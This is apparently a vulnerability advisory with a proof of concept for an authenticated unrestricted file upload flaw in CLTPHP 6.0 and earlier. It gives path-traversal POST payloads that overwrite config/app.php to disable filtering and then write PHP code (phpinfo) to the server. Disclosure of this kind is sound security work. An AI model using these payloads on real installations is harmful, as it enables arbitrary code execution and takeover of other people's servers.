# CLTPHP <= 6.0 Unrestricted Upload of File with Dangerous Type 1
## Description
    The system client does not handle these parameters correctly, resulting in an Unrestricted Upload of File with Dangerous Type.
## Vendor Homepage
    https://gitee.com/chichu/cltopen/
    https://www.cltphp.com/

## Author
    HuBen-Lab
## Proof of Concept
File:`application/admin/controller/Template.php `

Exploiting this vulnerability requires logging into the system.

1. Try to write 5.php to the static directory, click submit and grab the package.

   ![image-20230105144320513](img/63b7c3db9caf8.png)

   ![image-20230105143730688](img/63b7c3deaf84d.png)

   After visiting 5.php, I found that the code could not be parsed![image-20230105144130747](img/63b7c3e367eca.png)Check the source code and find that the < is converted to entity code format

   ![image-20230105144417865](img/63b7c3e619612.png)

2. There are two types of situations

   - CLTPHP = 6.0

     We just need to pass random values to override config/app.php to disable the filtering configuration

     ![image-20230105181153301](img/63b7c3ebd82b6.png)

     ```
     type=php&file=../../../../config/app&content=123
     ```

     Then pass in phpinfo

     ![image-20230105181250127](img/63b7c3f0618a7.png)

     ```
     type=php&file=../../../app&content=<?php phpinfo();?>
     ```

     Write success

     ![image-20230105181332464](img/63b7c3f4e9214.png)

   - CLTPHP  < 6.0
   
     just use this payload
   
     ```
     POST /index.php/admin/template/insert.html
     
     type=php&file=../../../../filename&content=<?php phpinfo();>
     ```
   
     
